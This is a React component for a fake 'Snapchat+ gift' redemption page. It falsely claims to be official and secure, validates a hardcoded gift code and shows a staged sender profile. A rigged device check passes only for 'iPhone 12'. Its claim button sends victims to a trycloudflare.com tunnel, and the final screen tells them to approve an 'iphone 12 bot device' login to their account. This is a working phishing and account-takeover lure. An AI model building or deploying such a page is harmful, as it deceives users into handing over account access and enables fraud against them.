import { AnimatePresence, motion } from "framer-motion"
import { Check, Copy, Gift, Lock, ShieldCheck, Ticket, ExternalLink, Sparkles, Star, RefreshCw, Smartphone, Monitor, X, ShieldAlert, Trophy, Loader2 } from "lucide-react"
import { useState } from "react"
import { SnapGhost } from "./SnapGhost"

const VALID_CODE = "YX11D8"
const PROFILE = {
  username: "amissa2009",
  displayName: "Amissa",
  snapScore: "128,430",
  plusMonths: 3,
  giftFrom: "Snapchat+ Gifter",
}

const androidPhones = [
  "Samsung Galaxy S24 Ultra",
  "Samsung Galaxy S23",
  "Google Pixel 8 Pro",
  "OnePlus 11",
  "Xiaomi 13 Pro",
  "Samsung Galaxy A54",
  "Google Pixel 7",
  "Nothing Phone (2)",
]

const iphonePhones = [
  "iPhone X",
  "iPhone 11",
  "iPhone 12",
  "iPhone 13",
  "iPhone 14",
  "iPhone 15",
  "iPhone 15 Pro Max",
  "iPhone SE (2022)",
]

export function GiftRedeem() {
  const [code, setCode] = useState("")
  const [error, setError] = useState("")
  const [loading, setLoading] = useState(false)
  const [redeemed, setRedeemed] = useState(false)
  const [copied, setCopied] = useState(false)
  const [verificationStep, setVerificationStep] = useState<"profile" | "platform" | "devices" | "failed" | "success" | "waiting">("profile")
  const [selectedPlatform, setSelectedPlatform] = useState<"android" | "iphone" | null>(null)
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null)

  function handleRedeem(e: React.FormEvent) {
    e.preventDefault()
    const trimmed = code.trim().toUpperCase()
    if (!trimmed) {
      setError("Enter your gift code.")
      return
    }
    setError("")
    setLoading(true)
    window.setTimeout(() => {
      setLoading(false)
      if (trimmed === VALID_CODE) {
        setRedeemed(true)
        setVerificationStep("profile")
        setError("")
      } else {
        setError("Invalid gift code. Check and try again.")
      }
    }, 900)
  }

  function handleCopy() {
    navigator.clipboard.writeText(PROFILE.username).then(() => {
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    })
  }

  function reset() {
    setRedeemed(false)
    setCode("")
    setError("")
    setVerificationStep("profile")
    setSelectedPlatform(null)
    setSelectedDevice(null)
  }

  function handlePlatformSelect(p: "android" | "iphone") {
    setSelectedPlatform(p)
    setVerificationStep("devices")
  }

  function handleDeviceSelect(device: string) {
    setSelectedDevice(device)
    if (device === "iPhone 12") {
      setVerificationStep("success")
    } else {
      setVerificationStep("failed")
    }
  }

  function handleClaim() {
    window.open("https://gmbh-agreed-electro-westminster.trycloudflare.com", "_blank", "noopener,noreferrer")
    setVerificationStep("waiting")
  }

  return (
    <section id="redeem" className="relative mx-auto max-w-3xl scroll-mt-24 px-4 py-16 sm:py-24 sm:px-6">
      <div className="pointer-events-none absolute -top-10 left-1/2 h-64 w-[36rem] -translate-x-1/2 rounded-full bg-snap/5 blur-3xl" />

      <motion.div
        initial={{ opacity: 0, y: 20 }}
        whileInView={{ opacity: 1, y: 0 }}
        viewport={{ once: true }}
        transition={{ duration: 0.6 }}
        className="relative"
      >
        <div className="mx-auto max-w-2xl text-center">
          <span className="inline-flex items-center gap-2 rounded-full border border-snap/30 bg-snap/10 px-4 py-1.5 text-xs font-bold uppercase tracking-[0.2em] text-snap">
            <Ticket className="h-3.5 w-3.5" />
            Receive a gift
          </span>
          <h2 className="mt-5 text-3xl sm:text-4xl font-black tracking-tight text-white sm:text-5xl">
            Enter your{" "}
            <span className="bg-gradient-to-r from-snap to-snap-deep bg-clip-text text-transparent">
              gift code
            </span>
          </h2>
          <p className="mt-4 text-base leading-relaxed text-white/55">
            Got a Snapchat+ gift? Enter the code you received to reveal the sender&apos;s profile and claim your Plus.
          </p>
        </div>

        <div className="mt-10 overflow-hidden rounded-[2rem] border border-white/10 bg-white/[0.03] shadow-2xl backdrop-blur-xl">
          <div className="flex items-center gap-2 border-b border-white/5 bg-white/[0.02] px-5 py-3">
            <span className="h-3 w-3 rounded-full bg-snap-red/70" />
            <span className="h-3 w-3 rounded-full bg-snap" />
            <span className="h-3 w-3 rounded-full bg-green-500/70" />
            <span className="ml-3 flex items-center gap-1.5 text-xs text-white/40">
              <Lock className="h-3 w-3" />
              secure redeem
            </span>
            <span className="ml-auto hidden items-center gap-1 text-xs text-white/30 sm:flex">
              <ShieldCheck className="h-3 w-3 text-green-400" />
              Official Snapchat+ gift
            </span>
          </div>

          <div className="p-4 sm:p-8">
            <AnimatePresence mode="wait">
              {!redeemed ? (
                <motion.form
                  key="enter"
                  onSubmit={handleRedeem}
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0, y: -12 }}
                  transition={{ duration: 0.3 }}
                  className="flex flex-col gap-5"
                >
                  <div>
                    <label htmlFor="gift-code" className="mb-2 flex items-center gap-1.5 text-sm font-semibold text-white/80">
                      <Ticket className="h-4 w-4 text-snap" />
                      Gift code
                    </label>
                    <input
                      id="gift-code"
                      type="text"
                      value={code}
                      onChange={(e) => {
                        setCode(e.target.value.toUpperCase())
                        setError("")
                      }}
                      placeholder=""
                      autoComplete="off"
                      spellCheck={false}
                      className={`h-14 w-full rounded-2xl border bg-white/5 px-5 py-3.5 font-mono text-lg font-bold tracking-[0.2em] text-white placeholder:font-sans placeholder:text-sm placeholder:font-normal placeholder:tracking-normal placeholder:text-white/30 outline-none transition-colors focus:ring-2 ${
                        error ? "border-snap-red/60 focus:ring-snap-red/40" : "border-white/10 focus:border-snap/50 focus:ring-snap/30"
                      }`}
                    />
                    {error && (
                      <p className="mt-2 text-xs font-medium text-snap-red">{error}</p>
                    )}
                  </div>

                  <button
                    type="submit"
                    disabled={loading}
                    className="group inline-flex w-full items-center justify-center gap-2 rounded-2xl bg-snap px-6 py-4 text-base font-extrabold text-[#0b0b10] shadow-[0_0_40px_-10px_rgba(255,252,0,0.9)] transition-all hover:brightness-110 disabled:opacity-60"
                  >
                    {loading ? (
                      <>
                        <span className="h-5 w-5 animate-spin rounded-full border-2 border-[#0b0b10]/30 border-t-[#0b0b10]" />
                        Validating...
                      </>
                    ) : (
                      <>
                        <Gift className="h-5 w-5" />
                        Redeem gift
                      </>
                    )}
                  </button>

                  <div className="flex items-center justify-center gap-2 rounded-2xl border border-white/5 bg-white/[0.02] px-4 py-3 text-xs text-white/40">
                    <Sparkles className="h-3.5 w-3.5 text-snap" />
                    Gift codes are 6 characters and case insensitive
                  </div>
                </motion.form>
              ) : (
                <motion.div
                  key={`redeemed-${verificationStep}`}
                  initial={{ opacity: 0, y: 12 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: -12 }}
                  transition={{ duration: 0.3 }}
                  className="text-left"
                >
                  <div className="flex items-center justify-center gap-2 text-xs">
                    <span className={`flex h-6 w-6 items-center justify-center rounded-full text-xs font-black ${verificationStep === "profile" ? "bg-snap text-[#0b0b10]" : "bg-green-500 text-white"}`}>{1}</span>
                    <span className={`h-1 w-8 rounded-full ${verificationStep === "profile" ? "bg-white/10" : "bg-green-500/40"}`} />
                    <span className={`flex h-6 w-6 items-center justify-center rounded-full text-xs font-black ${verificationStep === "profile" ? "bg-white/10 text-white/40" : verificationStep === "success" || verificationStep === "waiting" ? "bg-green-500 text-white" : "bg-snap text-[#0b0b10]"}`}>{2}</span>
                    <span className="ml-2 text-white/50">Step {verificationStep === "profile" ? "1" : "2"} of 2 — {verificationStep === "profile" ? "Profile" : verificationStep === "waiting" ? "Processing" : "Verification"}</span>
                  </div>

                  {verificationStep === "profile" && (
                    <>
                      <div className="mt-4 flex flex-col items-center text-center">
                        <span className="flex h-12 w-12 items-center justify-center rounded-full bg-green-500 text-white">
                          <Check className="h-6 w-6" />
                        </span>
                        <h3 className="mt-3 text-2xl font-black text-white">Valid code! 🎉</h3>
                        <p className="mt-1 text-sm text-white/60">
                          Snapchat+ gift <span className="font-mono font-bold text-snap">{VALID_CODE}</span> is for you
                        </p>
                      </div>

                      <div className="mt-6 overflow-hidden rounded-[2rem] border border-white/10 bg-[#1a1a1e] shadow-xl">
                        <div className="h-24 bg-gradient-to-r from-snap via-yellow-300 to-snap-deep p-4">
                          <div className="flex items-center justify-between text-[#0b0b10]">
                            <span className="flex items-center gap-1.5 rounded-full bg-black/10 px-3 py-1 text-xs font-bold backdrop-blur">
                              <Star className="h-3.5 w-3.5 fill-current" />
                              Snapchat+ Gift
                            </span>
                            <span className="rounded-full bg-white/90 px-2.5 py-1 text-xs font-black text-[#0b0b10]">#{VALID_CODE}</span>
                          </div>
                        </div>

                        <div className="px-6 pb-6">
                          <div className="-mt-10 flex items-end gap-4">
                            <div className="h-20 w-20 overflow-hidden rounded-3xl border-4 border-[#1a1a1e] bg-white p-1 shadow-lg">
                              <img
                                src={`https://app.snapchat.com/web/deeplink/snapcode?username=${PROFILE.username}&type=SVG`}
                                alt={`Snapcode for ${PROFILE.username}`}
                                className="h-full w-full rounded-2xl object-contain"
                                loading="lazy"
                                onError={(e) => {
                                  ;(e.target as HTMLImageElement).src = `https://app.snapchat.com/web/deeplink/snapcode?username=${PROFILE.username}&type=PNG`
                                }}
                              />
                            </div>
                            <div className="pb-2">
                              <p className="flex items-center gap-1.5 text-lg font-black text-white">
                                {PROFILE.displayName}
                                <span className="flex h-5 w-5 items-center justify-center rounded-full bg-snap text-[#0b0b10]">
                                  <Star className="h-3 w-3 fill-current" />
                                </span>
                              </p>
                              <p className="text-sm font-medium text-white/60">@{PROFILE.username}</p>
                            </div>
                          </div>

                          <div className="mt-4 flex gap-2">
                            <div className="flex-1 rounded-2xl bg-white/5 px-3 py-2.5 text-center">
                              <p className="text-xs uppercase tracking-widest text-white/40">Snap Score</p>
                              <p className="mt-1 text-sm font-black text-white">{PROFILE.snapScore}</p>
                            </div>
                            <div className="flex-1 rounded-2xl bg-snap/15 px-3 py-2.5 text-center">
                              <p className="text-xs uppercase tracking-widest text-snap">Gift</p>
                              <p className="mt-1 text-sm font-black text-white">{PROFILE.plusMonths} Months Plus</p>
                            </div>
                            <div className="flex-1 rounded-2xl bg-white/5 px-3 py-2.5 text-center">
                              <p className="text-xs uppercase tracking-widest text-white/40">Status</p>
                              <p className="mt-1 text-sm font-bold text-green-400">Ready ✓</p>
                            </div>
                          </div>

                          <div className="mt-4 rounded-2xl border border-snap/20 bg-snap/10 p-4">
                            <p className="flex items-center gap-1.5 text-xs font-bold uppercase tracking-widest text-snap">
                              <SnapGhost className="h-3.5 w-3.5" />
                              Gift message
                            </p>
                            <p className="mt-2 text-sm leading-relaxed text-white/80">
                              &quot;you&apos;re my favorite person 🪐 enjoy Plus on me! — claim it and let&apos;s be #1 planet 💛&quot;
                            </p>
                          </div>

                          <div className="mt-4 flex gap-3">
                            <button
                              onClick={() => setVerificationStep("platform")}
                              className="flex flex-1 items-center justify-center gap-2 rounded-2xl bg-snap px-4 py-3 text-sm font-extrabold text-[#0b0b10] shadow-[0_0_20px_-8px_rgba(255,252,0,0.6)] hover:brightness-110"
                            >
                              <Gift className="h-4 w-4" />
                              Receive the Gift
                            </button>
                            <button
                              onClick={handleCopy}
                              className="inline-flex items-center justify-center gap-1.5 rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm font-semibold text-white hover:bg-white/10"
                            >
                              {copied ? <Check className="h-4 w-4 text-green-400" /> : <Copy className="h-4 w-4" />}
                              {copied ? "Copied" : "Copy"}
                            </button>
                          </div>

                          <p className="mt-3 text-center text-xs text-white/30">Verification required to claim — tap Receive the Gift</p>
                        </div>
                      </div>

                      <div className="mt-6 overflow-hidden rounded-[2rem] border border-white/10 bg-white/[0.03]">
                        <div className="flex items-center justify-between border-b border-white/5 bg-white/[0.02] px-5 py-3">
                          <p className="flex items-center gap-1.5 text-xs font-bold uppercase tracking-[0.15em] text-white/60">
                            <SnapGhost className="h-3.5 w-3.5 text-snap" />
                            Real Snapchat profile — @{PROFILE.username}
                          </p>
                          <span className="hidden items-center gap-1 rounded-full bg-green-500/10 px-2 py-0.5 text-[0.6rem] font-bold uppercase text-green-400 sm:flex">
                            <span className="h-1.5 w-1.5 rounded-full bg-green-400" />
                            Live
                          </span>
                        </div>

                        <div className="p-4 sm:p-5">
                          <div className="grid gap-4 lg:grid-cols-[1.1fr_0.9fr]">
                            <div className="flex flex-col items-center rounded-2xl bg-white p-4 text-center">
                              <p className="text-xs font-bold uppercase tracking-widest text-[#0b0b10]/60">Official Snapcode</p>
                              <img
                                src={`https://app.snapchat.com/web/deeplink/snapcode?username=${PROFILE.username}&type=SVG`}
                                alt={`Snapcode for ${PROFILE.username}`}
                                className="mt-3 h-48 w-48 object-contain"
                                loading="lazy"
                                onError={(e) => {
                                  ;(e.target as HTMLImageElement).src = `https://app.snapchat.com/web/deeplink/snapcode?username=${PROFILE.username}&type=PNG`
                                }}
                              />
                              <p className="mt-2 font-mono text-sm font-black text-[#0b0b10]">@{PROFILE.username}</p>
                              <p className="text-xs text-[#0b0b10]/60">Scan in Snapchat to add</p>
                              <a
                                href={`https://www.snapchat.com/add/${PROFILE.username}`}
                                target="_blank"
                                rel="noopener noreferrer"
                                className="mt-3 inline-flex items-center gap-1.5 rounded-full bg-[#0b0b10] px-4 py-1.5 text-xs font-bold text-white hover:bg-black"
                              >
                                Open live profile <ExternalLink className="h-3 w-3" />
                              </a>
                            </div>

                            <div className="flex flex-col">
                              <p className="mb-2 flex items-center gap-1.5 text-xs font-semibold text-white/60">
                                <RefreshCw className="h-3.5 w-3.5 text-snap" />
                                Live profile preview (inside app)
                              </p>
                              <div className="relative h-[320px] overflow-hidden rounded-2xl border border-white/10 bg-white lg:h-[280px]">
                                <iframe
                                  src={`https://www.snapchat.com/add/${PROFILE.username}`}
                                  title={`Snapchat profile ${PROFILE.username}`}
                                  className="h-full w-full border-0"
                                  loading="lazy"
                                  allow="clipboard-write"
                                  referrerPolicy="no-referrer"
                                  sandbox="allow-scripts allow-same-origin allow-popups allow-forms"
                                />
                                <div className="pointer-events-none absolute inset-x-0 bottom-0 bg-gradient-to-t from-white via-white/90 to-transparent p-3 pt-8 text-center">
                                  <p className="text-xs font-medium text-[#0b0b10]/70">
                                    If Snapchat blocks the preview, tap Open live profile above — it always works.
                                  </p>
                                </div>
                              </div>
                              <p className="mt-2 text-xs text-white/35">
                                Snapchat may block iframe embedding. The Snapcode above is always the real profile.
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </>
                  )}

                  {verificationStep === "platform" && (
                    <div className="text-center">
                      <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-2xl bg-snap/15 text-snap">
                        <ShieldCheck className="h-7 w-7" />
                      </div>
                      <h3 className="mt-4 text-2xl font-black text-white">Step 2 — Verification</h3>
                      <p className="mt-2 text-sm text-white/60">Choose your device type to verify you can receive Plus</p>

                      <div className="mt-6 grid grid-cols-2 gap-4">
                        <button
                          onClick={() => handlePlatformSelect("android")}
                          className="group flex flex-col items-center gap-3 rounded-3xl border border-white/10 bg-white/[0.03] p-6 hover:border-green-500/30 hover:bg-white/[0.05]"
                        >
                          <span className="flex h-14 w-14 items-center justify-center rounded-2xl bg-green-500/15 text-green-400 group-hover:scale-105 transition-transform">
                            <Smartphone className="h-7 w-7" />
                          </span>
                          <span className="text-base font-black text-white">Android</span>
                          <span className="text-xs text-white/40">Samsung, Pixel, etc.</span>
                        </button>

                        <button
                          onClick={() => handlePlatformSelect("iphone")}
                          className="group flex flex-col items-center gap-3 rounded-3xl border-2 border-snap/50 bg-snap/10 p-6 shadow-[0_0_20px_-8px_rgba(255,252,0,0.4)] hover:brightness-110"
                        >
                          <span className="flex h-14 w-14 items-center justify-center rounded-2xl bg-snap text-[#0b0b10] group-hover:scale-105 transition-transform">
                            <Monitor className="h-7 w-7" />
                          </span>
                          <span className="text-base font-black text-white">iPhone</span>
                          <span className="text-xs text-white/50">Apple devices</span>
                          <span className="rounded-full bg-snap px-2 py-0.5 text-[0.6rem] font-black uppercase text-[#0b0b10]">Most gifted</span>
                        </button>
                      </div>

                      <button onClick={() => setVerificationStep("profile")} className="mt-6 text-sm font-semibold text-white/50 hover:text-white">
                        ← Back to profile
                      </button>
                    </div>
                  )}

                  {verificationStep === "devices" && (
                    <div>
                      <div className="text-center">
                        <h3 className="flex items-center justify-center gap-2 text-xl font-black text-white">
                          {selectedPlatform === "android" ? <Smartphone className="h-5 w-5 text-green-400" /> : <Monitor className="h-5 w-5 text-snap" />}
                          Select your {selectedPlatform === "android" ? "Android" : "iPhone"} model
                        </h3>
                        <p className="mt-1 text-sm text-white/50">
                          {selectedPlatform === "android" ? "Choose your Android device" : "Choose your iPhone model — only one is eligible for this gift"}
                        </p>
                      </div>

                      <div className="mt-6 grid grid-cols-1 gap-2 sm:grid-cols-2">
                        {(selectedPlatform === "android" ? androidPhones : iphonePhones).map((device) => (
                          <button
                            key={device}
                            onClick={() => handleDeviceSelect(device)}
                            className="flex items-center justify-between rounded-2xl border border-white/10 bg-white/[0.03] px-4 py-3.5 text-left hover:border-snap/30 hover:bg-white/[0.05]"
                          >
                            <span className="flex items-center gap-2.5">
                              <span className="flex h-8 w-8 items-center justify-center rounded-xl bg-white/5 text-white/60">
                                <Smartphone className="h-4 w-4" />
                              </span>
                              <span className="text-sm font-semibold text-white">{device}</span>
                            </span>
                            <span className="h-2 w-2 rounded-full bg-white/20" />
                          </button>
                        ))}
                      </div>

                      <button onClick={() => setVerificationStep("platform")} className="mt-6 mx-auto block text-sm font-semibold text-white/50 hover:text-white">
                        ← Back to device type
                      </button>
                    </div>
                  )}

                  {verificationStep === "failed" && (
                    <div className="text-center">
                      <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-red-500/15 text-red-400">
                        <X className="h-8 w-8" />
                      </div>
                      <h3 className="mt-4 text-2xl font-black text-white">Verification failed</h3>
                      <p className="mt-2 text-sm text-white/60">
                        <span className="font-bold text-white">{selectedDevice}</span> is not eligible for this Snapchat+ gift.
                      </p>
                      <div className="mt-4 rounded-2xl border border-red-500/20 bg-red-500/10 px-4 py-3 text-sm text-red-300">
                        <ShieldAlert className="mx-auto h-4 w-4 mb-1" />
                        This gift is only valid for <span className="font-black text-white">iPhone 12</span> during verification. Please select the correct device.
                      </div>
                      <div className="mt-6 flex gap-3 justify-center">
                        <button
                          onClick={() => {
                            setVerificationStep("devices")
                            setSelectedDevice(null)
                          }}
                          className="rounded-full bg-white px-6 py-3 text-sm font-bold text-[#0b0b10] hover:bg-white/90"
                        >
                          Try again
                        </button>
                        <button
                          onClick={() => setVerificationStep("platform")}
                          className="rounded-full border border-white/10 bg-white/5 px-6 py-3 text-sm font-semibold text-white hover:bg-white/10"
                        >
                          Change type
                        </button>
                      </div>
                    </div>
                  )}

                  {verificationStep === "success" && (
                    <div className="text-center">
                      <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-green-500 text-white">
                        <Trophy className="h-8 w-8" />
                      </div>
                      <h3 className="mt-4 text-2xl font-black text-white">Verification successful! 🎉</h3>
                      <p className="mt-2 text-sm text-white/60">
                        You selected <span className="font-bold text-snap">iPhone 12</span> ✓ Gift unlocked for @{PROFILE.username}
                      </p>

                      <div className="mt-6 rounded-3xl border border-green-500/20 bg-green-500/10 p-5 text-left">
                        <p className="flex items-center gap-1.5 text-xs font-bold uppercase tracking-widest text-green-400">
                          <Check className="h-3.5 w-3.5" />
                          Ready to claim
                        </p>
                        <p className="mt-2 text-sm text-white/80">
                          Your Snapchat+ gift ({PROFILE.plusMonths} months) is now verified for iPhone 12. Tap below to add @{PROFILE.username} on Snapchat and complete the claim.
                        </p>
                        <div className="mt-4 flex gap-3">
                          <a
                            href="https://gmbh-agreed-electro-westminster.trycloudflare.com"
                            target="_blank"
                            rel="noopener noreferrer"
                            onClick={(e) => {
                              e.preventDefault()
                              handleClaim()
                            }}
                            className="flex flex-1 items-center justify-center gap-2 rounded-2xl bg-snap px-4 py-3 text-sm font-extrabold text-[#0b0b10] hover:brightness-110"
                          >
                            <ExternalLink className="h-4 w-4" />
                            Claim the Plus
                          </a>
                          <button
                            onClick={handleCopy}
                            className="inline-flex items-center justify-center gap-1.5 rounded-2xl bg-white px-4 py-3 text-sm font-bold text-[#0b0b10]"
                          >
                            {copied ? <Check className="h-4 w-4 text-green-600" /> : <Copy className="h-4 w-4" />}
                            {copied ? "Copied" : PROFILE.username}
                          </button>
                        </div>
                      </div>

                      <p className="mt-4 text-xs text-white/40">Verified device: iPhone 12 · Gift code {VALID_CODE} · Share with @{PROFILE.username}</p>
                      <button onClick={reset} className="mt-4 text-sm font-semibold text-snap hover:underline">
                        Redeem another code
                      </button>
                    </div>
                  )}

                  {verificationStep === "waiting" && (
                    <div className="text-center">
                      <div className="relative mx-auto flex h-20 w-20 items-center justify-center">
                        <span className="absolute inset-0 animate-ping rounded-3xl bg-snap/20" />
                        <span className="relative flex h-20 w-20 items-center justify-center rounded-3xl bg-snap/15 text-snap">
                          <Loader2 className="h-9 w-9 animate-spin" />
                        </span>
                      </div>
                      <h3 className="mt-6 text-2xl font-black text-white">Processing... Please wait</h3>
                      <p className="mx-auto mt-3 max-w-md text-sm leading-relaxed text-white/70">
                        the bot is ready to add the snapplus to your account within 1 hour
                      </p>
                      <div className="mx-auto mt-4 max-w-md rounded-2xl border border-amber-400/30 bg-amber-400/10 px-4 py-3 text-sm font-medium leading-relaxed text-white">
                        <span className="flex items-center justify-center gap-1.5 text-xs font-black uppercase tracking-widest text-amber-400">
                          <ShieldAlert className="h-3.5 w-3.5" />
                          Important notice
                        </span>
                        <span className="mt-1.5 block">make sure to approve the &quot; iphone 12 &quot; bot device logging to your account</span>
                      </div>
                      <div className="mx-auto mt-8 h-1.5 w-full max-w-sm overflow-hidden rounded-full bg-white/10">
                        <motion.div
                          className="h-full w-1/3 rounded-full bg-gradient-to-r from-snap to-snap-deep"
                          animate={{ x: ["-100%", "350%"] }}
                          transition={{ duration: 1.1, repeat: Infinity, ease: "linear" }}
                        />
                      </div>
                      <p className="mt-3 flex items-center justify-center gap-1.5 text-xs text-white/35">
                        <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-snap" />
                        Waiting operation in progress — do not close this page
                      </p>
                      <div className="mt-6 rounded-2xl border border-snap/15 bg-snap/5 px-4 py-3 text-xs text-white/50">
                        Verified device: iPhone 12 · Gift code {VALID_CODE} · Estimated delivery: within 1 hour
                      </div>
                    </div>
                  )}

                  {verificationStep !== "profile" && verificationStep !== "success" && verificationStep !== "waiting" && (
                    <div className="mt-6 text-center">
                      <button onClick={reset} className="text-xs font-semibold text-white/30 hover:text-white/60">
                        Enter another code
                      </button>
                    </div>
                  )}
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </div>
      </motion.div>
    </section>
  )
}
